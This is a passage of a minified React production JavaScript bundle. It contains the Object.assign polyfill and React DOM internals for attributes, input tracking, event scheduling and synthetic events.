/*! For license information please see main.d349dc9c.js.LICENSE.txt */
!function(){"use strict";var n={725:function(n){var e=Object.getOwnPropertySymbols,t=Object.prototype.hasOwnProperty,r=Object.prototype.propertyIsEnumerable;function i(n){if(null===n||void 0===n)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(n)}n.exports=function(){try{if(!Object.assign)return!1;var n=new String("abc");if(n[5]="de","5"===Object.getOwnPropertyNames(n)[0])return!1;for(var e={},t=0;t<10;t++)e["_"+String.fromCharCode(t)]=t;if("0123456789"!==Object.getOwnPropertyNames(e).map((function(n){return e[n]})).join(""))return!1;var r={};return"abcdefghijklmnopqrst".split("").forEach((function(n){r[n]=n})),"abcdefghijklmnopqrst"===Object.keys(Object.assign({},r)).join("")}catch(i){return!1}}()?Object.assign:function(n,s){for(var a,o,l=i(n),c=1;c<arguments.length;c++){for(var u in a=Object(arguments[c]))t.call(a,u)&&(l[u]=a[u]);if(e){o=e(a);for(var d=0;d<o.length;d++)r.call(a,o[d])&&(l[o[d]]=a[o[d]])}}return l}},463:function(n,e,t){var r=t(791),i=t(725),s=t(296);function a(n){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+n,t=1;t<arguments.length;t++)e+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+n+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}if(!r)throw Error(a(227));var o=new Set,l={};function c(n,e){u(n,e),u(n+"Capture",e)}function u(n,e){for(l[n]=e,n=0;n<e.length;n++)o.add(e[n])}var d=!("undefined"===typeof window||"undefined"===typeof window.document||"undefined"===typeof window.document.createElement),f=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,p=Object.prototype.hasOwnProperty,_={},g={};function m(n,e,t,r,i,s,a){this.acceptsBooleans=2===e||3===e||4===e,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=t,this.propertyName=n,this.type=e,this.sanitizeURL=s,this.removeEmptyString=a}var h={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(n){h[n]=new m(n,0,!1,n,null,!1,!1)})),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach((function(n){var e=n[0];h[e]=new m(e,1,!1,n[1],null,!1,!1)})),["contentEditable","draggable","spellCheck","value"].forEach((function(n){h[n]=new m(n,2,!1,n.toLowerCase(),null,!1,!1)})),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach((function(n){h[n]=new m(n,2,!1,n,null,!1,!1)})),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(n){h[n]=new m(n,3,!1,n.toLowerCase(),null,!1,!1)})),["checked","multiple","muted","selected"].forEach((function(n){h[n]=new m(n,3,!0,n,null,!1,!1)})),["capture","download"].forEach((function(n){h[n]=new m(n,4,!1,n,null,!1,!1)})),["cols","rows","size","span"].forEach((function(n){h[n]=new m(n,6,!1,n,null,!1,!1)})),["rowSpan","start"].forEach((function(n){h[n]=new m(n,5,!1,n.toLowerCase(),null,!1,!1)}));var k=/[\-:]([a-z])/g;function b(n){return n[1].toUpperCase()}function y(n,e,t,r){var i=h.hasOwnProperty(e)?h[e]:null;(null!==i?0===i.type:!r&&(2<e.length&&("o"===e[0]||"O"===e[0])&&("n"===e[1]||"N"===e[1])))||(function(n,e,t,r){if(null===e||"undefined"===typeof e||function(n,e,t,r){if(null!==t&&0===t.type)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return!r&&(null!==t?!t.acceptsBooleans:"data-"!==(n=n.toLowerCase().slice(0,5))&&"aria-"!==n);default:return!1}}(n,e,t,r))return!0;if(r)return!1;if(null!==t)switch(t.type){case 3:return!e;case 4:return!1===e;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}(e,t,i,r)&&(t=null),r||null===i?function(n){return!!p.call(g,n)||!p.call(_,n)&&(f.test(n)?g[n]=!0:(_[n]=!0,!1))}(e)&&(null===t?n.removeAttribute(e):n.setAttribute(e,""+t)):i.mustUseProperty?n[i.propertyName]=null===t?3!==i.type&&"":t:(e=i.attributeName,r=i.attributeNamespace,null===t?n.removeAttribute(e):(t=3===(i=i.type)||4===i&&!0===t?"":""+t,r?n.setAttributeNS(r,e,t):n.setAttribute(e,t))))}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(n){var e=n.replace(k,b);h[e]=new m(e,1,!1,n,null,!1,!1)})),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(n){var e=n.replace(k,b);h[e]=new m(e,1,!1,n,"http://www.w3.org/1999/xlink",!1,!1)})),["xml:base","xml:lang","xml:space"].forEach((function(n){var e=n.replace(k,b);h[e]=new m(e,1,!1,n,"http://www.w3.org/XML/1998/namespace",!1,!1)})),["tabIndex","crossOrigin"].forEach((function(n){h[n]=new m(n,1,!1,n.toLowerCase(),null,!1,!1)})),h.xlinkHref=new m("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach((function(n){h[n]=new m(n,1,!1,n.toLowerCase(),null,!0,!0)}));var S=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,v=60103,x=60106,E=60107,T=60108,I=60114,w=60109,N=60110,C=60112,P=60113,L=60120,A=60115,D=60116,O=60121,R=60128,F=60129,B=60130,M=60131;if("function"===typeof Symbol&&Symbol.for){var U=Symbol.for;v=U("react.element"),x=U("react.portal"),E=U("react.fragment"),T=U("react.strict_mode"),I=U("react.profiler"),w=U("react.provider"),N=U("react.context"),C=U("react.forward_ref"),P=U("react.suspense"),L=U("react.suspense_list"),A=U("react.memo"),D=U("react.lazy"),O=U("react.block"),U("react.scope"),R=U("react.opaque.id"),F=U("react.debug_trace_mode"),B=U("react.offscreen"),M=U("react.legacy_hidden")}var q,G="function"===typeof Symbol&&Symbol.iterator;function z(n){return null===n||"object"!==typeof n?null:"function"===typeof(n=G&&n[G]||n["@@iterator"])?n:null}function H(n){if(void 0===q)try{throw Error()}catch(t){var e=t.stack.trim().match(/\n( *(at )?)/);q=e&&e[1]||""}return"\n"+q+n}var V=!1;function j(n,e){if(!n||V)return"";V=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),"object"===typeof Reflect&&Reflect.construct){try{Reflect.construct(e,[])}catch(l){var r=l}Reflect.construct(n,[],e)}else{try{e.call()}catch(l){r=l}n.call(e.prototype)}else{try{throw Error()}catch(l){r=l}n()}}catch(l){if(l&&r&&"string"===typeof l.stack){for(var i=l.stack.split("\n"),s=r.stack.split("\n"),a=i.length-1,o=s.length-1;1<=a&&0<=o&&i[a]!==s[o];)o--;for(;1<=a&&0<=o;a--,o--)if(i[a]!==s[o]){if(1!==a||1!==o)do{if(a--,0>--o||i[a]!==s[o])return"\n"+i[a].replace(" at new "," at ")}while(1<=a&&0<=o);break}}}finally{V=!1,Error.prepareStackTrace=t}return(n=n?n.displayName||n.name:"")?H(n):""}function K(n){switch(n.tag){case 5:return H(n.type);case 16:return H("Lazy");case 13:return H("Suspense");case 19:return H("SuspenseList");case 0:case 2:case 15:return n=j(n.type,!1);case 11:return n=j(n.type.render,!1);case 22:return n=j(n.type._render,!1);case 1:return n=j(n.type,!0);default:return""}}function W(n){if(null==n)return null;if("function"===typeof n)return n.displayName||n.name||null;if("string"===typeof n)return n;switch(n){case E:return"Fragment";case x:return"Portal";case I:return"Profiler";case T:return"StrictMode";case P:return"Suspense";case L:return"SuspenseList"}if("object"===typeof n)switch(n.$$typeof){case N:return(n.displayName||"Context")+".Consumer";case w:return(n._context.displayName||"Context")+".Provider";case C:var e=n.render;return e=e.displayName||e.name||"",n.displayName||(""!==e?"ForwardRef("+e+")":"ForwardRef");case A:return W(n.type);case O:return W(n._render);case D:e=n._payload,n=n._init;try{return W(n(e))}catch(t){}}return null}function Y(n){switch(typeof n){case"boolean":case"number":case"object":case"string":case"undefined":return n;default:return""}}function X(n){var e=n.type;return(n=n.nodeName)&&"input"===n.toLowerCase()&&("checkbox"===e||"radio"===e)}function Q(n){n._valueTracker||(n._valueTracker=function(n){var e=X(n)?"checked":"value",t=Object.getOwnPropertyDescriptor(n.constructor.prototype,e),r=""+n[e];if(!n.hasOwnProperty(e)&&"undefined"!==typeof t&&"function"===typeof t.get&&"function"===typeof t.set){var i=t.get,s=t.set;return Object.defineProperty(n,e,{configurable:!0,get:function(){return i.call(this)},set:function(n){r=""+n,s.call(this,n)}}),Object.defineProperty(n,e,{enumerable:t.enumerable}),{getValue:function(){return r},setValue:function(n){r=""+n},stopTracking:function(){n._valueTracker=null,delete n[e]}}}}(n))}function $(n){if(!n)return!1;var e=n._valueTracker;if(!e)return!0;var t=e.getValue(),r="";return n&&(r=X(n)?n.checked?"true":"false":n.value),(n=r)!==t&&(e.setValue(n),!0)}function J(n){if("undefined"===typeof(n=n||("undefined"!==typeof document?document:void 0)))return null;try{return n.activeElement||n.body}catch(e){return n.body}}function Z(n,e){var t=e.checked;return i({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=t?t:n._wrapperState.initialChecked})}function nn(n,e){var t=null==e.defaultValue?"":e.defaultValue,r=null!=e.checked?e.checked:e.defaultChecked;t=Y(null!=e.value?e.value:t),n._wrapperState={initialChecked:r,initialValue:t,controlled:"checkbox"===e.type||"radio"===e.type?null!=e.checked:null!=e.value}}function en(n,e){null!=(e=e.checked)&&y(n,"checked",e,!1)}function tn(n,e){en(n,e);var t=Y(e.value),r=e.type;if(null!=t)"number"===r?(0===t&&""===n.value||n.value!=t)&&(n.value=""+t):n.value!==""+t&&(n.value=""+t);else if("submit"===r||"reset"===r)return void n.removeAttribute("value");e.hasOwnProperty("value")?sn(n,e.type,t):e.hasOwnProperty("defaultValue")&&sn(n,e.type,Y(e.defaultValue)),null==e.checked&&null!=e.defaultChecked&&(n.defaultChecked=!!e.defaultChecked)}function rn(n,e,t){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var r=e.type;if(!("submit"!==r&&"reset"!==r||void 0!==e.value&&null!==e.value))return;e=""+n._wrapperState.initialValue,t||e===n.value||(n.value=e),n.defaultValue=e}""!==(t=n.name)&&(n.name=""),n.defaultChecked=!!n._wrapperState.initialChecked,""!==t&&(n.name=t)}function sn(n,e,t){"number"===e&&J(n.ownerDocument)===n||(null==t?n.defaultValue=""+n._wrapperState.initialValue:n.defaultValue!==""+t&&(n.defaultValue=""+t))}function an(n,e){return n=i({children:void 0},e),(e=function(n){var e="";return r.Children.forEach(n,(function(n){null!=n&&(e+=n)})),e}(e.children))&&(n.children=e),n}function on(n,e,t,r){if(n=n.options,e){e={};for(var i=0;i<t.length;i++)e["$"+t[i]]=!0;for(t=0;t<n.length;t++)i=e.hasOwnProperty("$"+n[t].value),n[t].selected!==i&&(n[t].selected=i),i&&r&&(n[t].defaultSelected=!0)}else{for(t=""+Y(t),e=null,i=0;i<n.length;i++){if(n[i].value===t)return n[i].selected=!0,void(r&&(n[i].defaultSelected=!0));null!==e||n[i].disabled||(e=n[i])}null!==e&&(e.selected=!0)}}function ln(n,e){if(null!=e.dangerouslySetInnerHTML)throw Error(a(91));return i({},e,{value:void 0,defaultValue:void 0,children:""+n._wrapperState.initialValue})}function cn(n,e){var t=e.value;if(null==t){if(t=e.children,e=e.defaultValue,null!=t){if(null!=e)throw Error(a(92));if(Array.isArray(t)){if(!(1>=t.length))throw Error(a(93));t=t[0]}e=t}null==e&&(e=""),t=e}n._wrapperState={initialValue:Y(t)}}function un(n,e){var t=Y(e.value),r=Y(e.defaultValue);null!=t&&((t=""+t)!==n.value&&(n.value=t),null==e.defaultValue&&n.defaultValue!==t&&(n.defaultValue=t)),null!=r&&(n.defaultValue=""+r)}function dn(n){var e=n.textContent;e===n._wrapperState.initialValue&&""!==e&&null!==e&&(n.value=e)}var fn="http://www.w3.org/1999/xhtml",pn="http://www.w3.org/2000/svg";function _n(n){switch(n){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function gn(n,e){return null==n||"http://www.w3.org/1999/xhtml"===n?_n(e):"http://www.w3.org/2000/svg"===n&&"foreignObject"===e?"http://www.w3.org/1999/xhtml":n}var mn,hn,kn=(hn=function(n,e){if(n.namespaceURI!==pn||"innerHTML"in n)n.innerHTML=e;else{for((mn=mn||document.createElement("div")).innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=mn.firstChild;n.firstChild;)n.removeChild(n.firstChild);for(;e.firstChild;)n.appendChild(e.firstChild)}},"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(n,e,t,r){MSApp.execUnsafeLocalFunction((function(){return hn(n,e)}))}:hn);function bn(n,e){if(e){var t=n.firstChild;if(t&&t===n.lastChild&&3===t.nodeType)return void(t.nodeValue=e)}n.textContent=e}var yn={animationIterationCount:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Sn=["Webkit","ms","Moz","O"];function vn(n,e,t){return null==e||"boolean"===typeof e||""===e?"":t||"number"!==typeof e||0===e||yn.hasOwnProperty(n)&&yn[n]?(""+e).trim():e+"px"}function xn(n,e){for(var t in n=n.style,e)if(e.hasOwnProperty(t)){var r=0===t.indexOf("--"),i=vn(t,e[t],r);"float"===t&&(t="cssFloat"),r?n.setProperty(t,i):n[t]=i}}Object.keys(yn).forEach((function(n){Sn.forEach((function(e){e=e+n.charAt(0).toUpperCase()+n.substring(1),yn[e]=yn[n]}))}));var En=i({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Tn(n,e){if(e){if(En[n]&&(null!=e.children||null!=e.dangerouslySetInnerHTML))throw Error(a(137,n));if(null!=e.dangerouslySetInnerHTML){if(null!=e.children)throw Error(a(60));if("object"!==typeof e.dangerouslySetInnerHTML||!("__html"in e.dangerouslySetInnerHTML))throw Error(a(61))}if(null!=e.style&&"object"!==typeof e.style)throw Error(a(62))}}function In(n,e){if(-1===n.indexOf("-"))return"string"===typeof e.is;switch(n){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}function wn(n){return(n=n.target||n.srcElement||window).correspondingUseElement&&(n=n.correspondingUseElement),3===n.nodeType?n.parentNode:n}var Nn=null,Cn=null,Pn=null;function Ln(n){if(n=ri(n)){if("function"!==typeof Nn)throw Error(a(280));var e=n.stateNode;e&&(e=si(e),Nn(n.stateNode,n.type,e))}}function An(n){Cn?Pn?Pn.push(n):Pn=[n]:Cn=n}function Dn(){if(Cn){var n=Cn,e=Pn;if(Pn=Cn=null,Ln(n),e)for(n=0;n<e.length;n++)Ln(e[n])}}function On(n,e){return n(e)}function Rn(n,e,t,r,i){return n(e,t,r,i)}function Fn(){}var Bn=On,Mn=!1,Un=!1;function qn(){null===Cn&&null===Pn||(Fn(),Dn())}function Gn(n,e){var t=n.stateNode;if(null===t)return null;var r=si(t);if(null===r)return null;t=r[e];n:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(r=!("button"===(n=n.type)||"input"===n||"select"===n||"textarea"===n)),n=!r;break n;default:n=!1}if(n)return null;if(t&&"function"!==typeof t)throw Error(a(231,e,typeof t));return t}var zn=!1;if(d)try{var Hn={};Object.defineProperty(Hn,"passive",{get:function(){zn=!0}}),window.addEventListener("test",Hn,Hn),window.removeEventListener("test",Hn,Hn)}catch(hn){zn=!1}function Vn(n,e,t,r,i,s,a,o,l){var c=Array.prototype.slice.call(arguments,3);try{e.apply(t,c)}catch(u){this.onError(u)}}var jn=!1,Kn=null,Wn=!1,Yn=null,Xn={onError:function(n){jn=!0,Kn=n}};function Qn(n,e,t,r,i,s,a,o,l){jn=!1,Kn=null,Vn.apply(Xn,arguments)}function $n(n){var e=n,t=n;if(n.alternate)for(;e.return;)e=e.return;else{n=e;do{0!==(1026&(e=n).flags)&&(t=e.return),n=e.return}while(n)}return 3===e.tag?t:null}function Jn(n){if(13===n.tag){var e=n.memoizedState;if(null===e&&(null!==(n=n.alternate)&&(e=n.memoizedState)),null!==e)return e.dehydrated}return null}function Zn(n){if($n(n)!==n)throw Error(a(188))}function ne(n){if(n=function(n){var e=n.alternate;if(!e){if(null===(e=$n(n)))throw Error(a(188));return e!==n?null:n}for(var t=n,r=e;;){var i=t.return;if(null===i)break;var s=i.alternate;if(null===s){if(null!==(r=i.return)){t=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===t)return Zn(i),n;if(s===r)return Zn(i),e;s=s.sibling}throw Error(a(188))}if(t.return!==r.return)t=i,r=s;else{for(var o=!1,l=i.child;l;){if(l===t){o=!0,t=i,r=s;break}if(l===r){o=!0,r=i,t=s;break}l=l.sibling}if(!o){for(l=s.child;l;){if(l===t){o=!0,t=s,r=i;break}if(l===r){o=!0,r=s,t=i;break}l=l.sibling}if(!o)throw Error(a(189))}}if(t.alternate!==r)throw Error(a(190))}if(3!==t.tag)throw Error(a(188));return t.stateNode.current===t?n:e}(n),!n)return null;for(var e=n;;){if(5===e.tag||6===e.tag)return e;if(e.child)e.child.return=e,e=e.child;else{if(e===n)break;for(;!e.sibling;){if(!e.return||e.return===n)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}}return null}function ee(n,e){for(var t=n.alternate;null!==e;){if(e===n||e===t)return!0;e=e.return}return!1}var te,re,ie,se,ae=!1,oe=[],le=null,ce=null,ue=null,de=new Map,fe=new Map,pe=[],_e="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function ge(n,e,t,r,i){return{blockedOn:n,domEventName:e,eventSystemFlags:16|t,nativeEvent:i,targetContainers:[r]}}function me(n,e){switch(n){case"focusin":case"focusout":le=null;break;case"dragenter":case"dragleave":ce=null;break;case"mouseover":case"mouseout":ue=null;break;case"pointerover":case"pointerout":de.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":fe.delete(e.pointerId)}}function he(n,e,t,r,i,s){return null===n||n.nativeEvent!==s?(n=ge(e,t,r,i,s),null!==e&&(null!==(e=ri(e))&&re(e)),n):(n.eventSystemFlags|=r,e=n.targetContainers,null!==i&&-1===e.indexOf(i)&&e.push(i),n)}function ke(n){var e=ti(n.target);if(null!==e){var t=$n(e);if(null!==t)if(13===(e=t.tag)){if(null!==(e=Jn(t)))return n.blockedOn=e,void se(n.lanePriority,(function(){s.unstable_runWithPriority(n.priority,(function(){ie(t)}))}))}else if(3===e&&t.stateNode.hydrate)return void(n.blockedOn=3===t.tag?t.stateNode.containerInfo:null)}n.blockedOn=null}function be(n){if(null!==n.blockedOn)return!1;for(var e=n.targetContainers;0<e.length;){var t=nt(n.domEventName,n.eventSystemFlags,e[0],n.nativeEvent);if(null!==t)return null!==(e=ri(t))&&re(e),n.blockedOn=t,!1;e.shift()}return!0}function ye(n,e,t){be(n)&&t.delete(e)}function Se(){for(ae=!1;0<oe.length;){var n=oe[0];if(null!==n.blockedOn){null!==(n=ri(n.blockedOn))&&te(n);break}for(var e=n.targetContainers;0<e.length;){var t=nt(n.domEventName,n.eventSystemFlags,e[0],n.nativeEvent);if(null!==t){n.blockedOn=t;break}e.shift()}null===n.blockedOn&&oe.shift()}null!==le&&be(le)&&(le=null),null!==ce&&be(ce)&&(ce=null),null!==ue&&be(ue)&&(ue=null),de.forEach(ye),fe.forEach(ye)}function ve(n,e){n.blockedOn===e&&(n.blockedOn=null,ae||(ae=!0,s.unstable_scheduleCallback(s.unstable_NormalPriority,Se)))}function xe(n){function e(e){return ve(e,n)}if(0<oe.length){ve(oe[0],n);for(var t=1;t<oe.length;t++){var r=oe[t];r.blockedOn===n&&(r.blockedOn=null)}}for(null!==le&&ve(le,n),null!==ce&&ve(ce,n),null!==ue&&ve(ue,n),de.forEach(e),fe.forEach(e),t=0;t<pe.length;t++)(r=pe[t]).blockedOn===n&&(r.blockedOn=null);for(;0<pe.length&&null===(t=pe[0]).blockedOn;)ke(t),null===t.blockedOn&&pe.shift()}function Ee(n,e){var t={};return t[n.toLowerCase()]=e.toLowerCase(),t["Webkit"+n]="webkit"+e,t["Moz"+n]="moz"+e,t}var Te={animationend:Ee("Animation","AnimationEnd"),animationiteration:Ee("Animation","AnimationIteration"),animationstart:Ee("Animation","AnimationStart"),transitionend:Ee("Transition","TransitionEnd")},Ie={},we={};function Ne(n){if(Ie[n])return Ie[n];if(!Te[n])return n;var e,t=Te[n];for(e in t)if(t.hasOwnProperty(e)&&e in we)return Ie[n]=t[e];return n}d&&(we=document.createElement("div").style,"AnimationEvent"in window||(delete Te.animationend.animation,delete Te.animationiteration.animation,delete Te.animationstart.animation),"TransitionEvent"in window||delete Te.transitionend.transition);var Ce=Ne("animationend"),Pe=Ne("animationiteration"),Le=Ne("animationstart"),Ae=Ne("transitionend"),De=new Map,Oe=new Map,Re=["abort","abort",Ce,"animationEnd",Pe,"animationIteration",Le,"animationStart","canplay","canPlay","canplaythrough","canPlayThrough","durationchange","durationChange","emptied","emptied","encrypted","encrypted","ended","ended","error","error","gotpointercapture","gotPointerCapture","load","load","loadeddata","loadedData","loadedmetadata","loadedMetadata","loadstart","loadStart","lostpointercapture","lostPointerCapture","playing","playing","progress","progress","seeking","seeking","stalled","stalled","suspend","suspend","timeupdate","timeUpdate",Ae,"transitionEnd","waiting","waiting"];function Fe(n,e){for(var t=0;t<n.length;t+=2){var r=n[t],i=n[t+1];i="on"+(i[0].toUpperCase()+i.slice(1)),Oe.set(r,e),De.set(r,i),c(i,[r])}}(0,s.unstable_now)();var Be=8;function Me(n){if(0!==(1&n))return Be=15,1;if(0!==(2&n))return Be=14,2;if(0!==(4&n))return Be=13,4;var e=24&n;return 0!==e?(Be=12,e):0!==(32&n)?(Be=11,32):0!==(e=192&n)?(Be=10,e):0!==(256&n)?(Be=9,256):0!==(e=3584&n)?(Be=8,e):0!==(4096&n)?(Be=7,4096):0!==(e=4186112&n)?(Be=6,e):0!==(e=62914560&n)?(Be=5,e):67108864&n?(Be=4,67108864):0!==(134217728&n)?(Be=3,134217728):0!==(e=805306368&n)?(Be=2,e):0!==(1073741824&n)?(Be=1,1073741824):(Be=8,n)}function Ue(n,e){var t=n.pendingLanes;if(0===t)return Be=0;var r=0,i=0,s=n.expiredLanes,a=n.suspendedLanes,o=n.pingedLanes;if(0!==s)r=s,i=Be=15;else if(0!==(s=134217727&t)){var l=s&~a;0!==l?(r=Me(l),i=Be):0!==(o&=s)&&(r=Me(o),i=Be)}else 0!==(s=t&~a)?(r=Me(s),i=Be):0!==o&&(r=Me(o),i=Be);if(0===r)return 0;if(r=t&((0>(r=31-je(r))?0:1<<r)<<1)-1,0!==e&&e!==r&&0===(e&a)){if(Me(e),i<=Be)return e;Be=i}if(0!==(e=n.entangledLanes))for(n=n.entanglements,e&=r;0<e;)i=1<<(t=31-je(e)),r|=n[t],e&=~i;return r}function qe(n){return 0!==(n=-1073741825&n.pendingLanes)?n:1073741824&n?1073741824:0}function Ge(n,e){switch(n){case 15:return 1;case 14:return 2;case 12:return 0===(n=ze(24&~e))?Ge(10,e):n;case 10:return 0===(n=ze(192&~e))?Ge(8,e):n;case 8:return 0===(n=ze(3584&~e))&&(0===(n=ze(4186112&~e))&&(n=512)),n;case 2:return 0===(e=ze(805306368&~e))&&(e=268435456),e}throw Error(a(358,n))}function ze(n){return n&-n}function He(n){for(var e=[],t=0;31>t;t++)e.push(n);return e}function Ve(n,e,t){n.pendingLanes|=e;var r=e-1;n.suspendedLanes&=r,n.pingedLanes&=r,(n=n.eventTimes)[e=31-je(e)]=t}var je=Math.clz32?Math.clz32:function(n){return 0===n?32:31-(Ke(n)/We|0)|0},Ke=Math.log,We=Math.LN2;var Ye=s.unstable_UserBlockingPriority,Xe=s.unstable_runWithPriority,Qe=!0;function $e(n,e,t,r){Mn||Fn();var i=Ze,s=Mn;Mn=!0;try{Rn(i,n,e,t,r)}finally{(Mn=s)||qn()}}function Je(n,e,t,r){Xe(Ye,Ze.bind(null,n,e,t,r))}function Ze(n,e,t,r){var i;if(Qe)if((i=0===(4&e))&&0<oe.length&&-1<_e.indexOf(n))n=ge(null,n,e,t,r),oe.push(n);else{var s=nt(n,e,t,r);if(null===s)i&&me(n,r);else{if(i){if(-1<_e.indexOf(n))return n=ge(s,n,e,t,r),void oe.push(n);if(function(n,e,t,r,i){switch(e){case"focusin":return le=he(le,n,e,t,r,i),!0;case"dragenter":return ce=he(ce,n,e,t,r,i),!0;case"mouseover":return ue=he(ue,n,e,t,r,i),!0;case"pointerover":var s=i.pointerId;return de.set(s,he(de.get(s)||null,n,e,t,r,i)),!0;case"gotpointercapture":return s=i.pointerId,fe.set(s,he(fe.get(s)||null,n,e,t,r,i)),!0}return!1}(s,n,e,t,r))return;me(n,r)}Rr(n,e,r,null,t)}}}function nt(n,e,t,r){var i=wn(r);if(null!==(i=ti(i))){var s=$n(i);if(null===s)i=null;else{var a=s.tag;if(13===a){if(null!==(i=Jn(s)))return i;i=null}else if(3===a){if(s.stateNode.hydrate)return 3===s.tag?s.stateNode.containerInfo:null;i=null}else s!==i&&(i=null)}}return Rr(n,e,r,i,t),null}var et=null,tt=null,rt=null;function it(){if(rt)return rt;var n,e,t=tt,r=t.length,i="value"in et?et.value:et.textContent,s=i.length;for(n=0;n<r&&t[n]===i[n];n++);var a=r-n;for(e=1;e<=a&&t[r-e]===i[s-e];e++);return rt=i.slice(n,1<e?1-e:void 0)}function st(n){var e=n.keyCode;return"charCode"in n?0===(n=n.charCode)&&13===e&&(n=13):n=e,10===n&&(n=13),32<=n||13===n?n:0}function at(){return!0}function ot(){return!1}function lt(n){function e(e,t,r,i,s){for(var a in this._reactName=e,this._targetInst=r,this.type=t,this.nativeEvent=i,this.target=s,this.currentTarget=null,n)n.hasOwnProperty(a)&&(e=n[a],this[a]=e?e(i):i[a]);return this.isDefaultPrevented=(null!=i.defaultPrevented?i.defaultPrevented:!1===i.returnValue)?at:ot,this.isPropagationStopped=ot,this}return i(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():"unknown"!==typeof n.returnValue&&(n.returnValue=!1),this.isDefaultPrevented=at)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():"unknown"!==typeof n.cancelBubble&&(n.cancelBubble=!0),this.isPropagationStopped=at)},persist:function(){},isPersistent:at}),e}var ct,ut,dt,ft={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(n){return n.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},pt=lt(ft),_t=i({},ft,{view:0,detail:0}),gt=lt(_t),mt=i({},_t,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Nt,button:0,buttons:0,relatedTarget:function(n){return void 0===n.relatedTarget?n.fromElement===n.srcElement?n.toElement:n.fromElement:n.relatedTarget},movementX:function(n){return"movementX"in 